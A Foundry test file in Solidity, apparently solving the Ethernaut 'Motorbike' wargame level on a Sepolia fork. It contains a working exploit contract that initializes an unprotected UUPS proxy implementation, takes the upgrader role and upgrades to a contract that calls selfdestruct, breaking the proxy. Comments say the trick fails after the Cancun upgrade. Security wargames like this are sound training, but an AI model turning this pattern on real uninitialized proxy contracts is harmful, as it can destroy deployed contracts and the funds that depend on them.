// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface Motorbike{
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

// no longer works from cancun
contract Attacker {
    address owner;
    constructor(){
        owner = msg.sender;
    }
    function attack(address impl) public {
        Motorbike(impl).initialize();
        Motorbike(impl).upgradeToAndCall(address(this), abi.encodeWithSignature("killit()"));
    }

    function killit() public{
        selfdestruct(payable(owner));
    }
}

contract PuzzleWalletTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5467848);
    }

    function test_motorbike() public {
        Motorbike motorbike = Motorbike(0x60A687AdB38B109D36Fab82f7BCb71220D4d9d7c);
        Attacker attacker =  new Attacker();
        attacker.attack(0x8329F94e77771BABDEd95D19112EE831abEe21cf);

        // This stops working from Cancun upgrade
        vm.expectRevert();
        motorbike.upgrader();
    }
}
